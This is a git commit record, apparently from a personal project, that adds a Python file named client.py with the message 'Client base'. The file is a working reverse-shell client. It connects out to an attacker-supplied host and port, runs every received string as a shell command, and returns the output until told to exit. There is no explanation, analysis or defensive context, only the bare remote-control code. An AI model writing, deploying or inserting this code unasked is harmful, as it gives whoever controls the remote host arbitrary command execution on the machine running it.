c6fbe62524ba579ae183b2d255a93fc93dc10753
LouisTM <88114567+lmaoits@users.noreply.github.com>
2025-04-11 08:56:53 +0200

    Client base

---
+++ client.py
@@ -0,0 +1,25 @@
+import socket
+import subprocess as sp
+import sys
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+conn.connect((host, port))
+
+while True:
+    command = conn.recv(1024).decode()
+    if command != "exit":
+        sh = sp.Popen(command, shell=True,
+                      stdout=sp.PIPE,
+                      stderr=sp.PIPE,
+                      stdin=sp.PIPE)
+        out, err = sh.communicate()
+        result = out + err
+        length = str(len(result)).zfill(16)
+        conn.send(length.encode() + result)
+    else:
+        break
+
+conn.close()
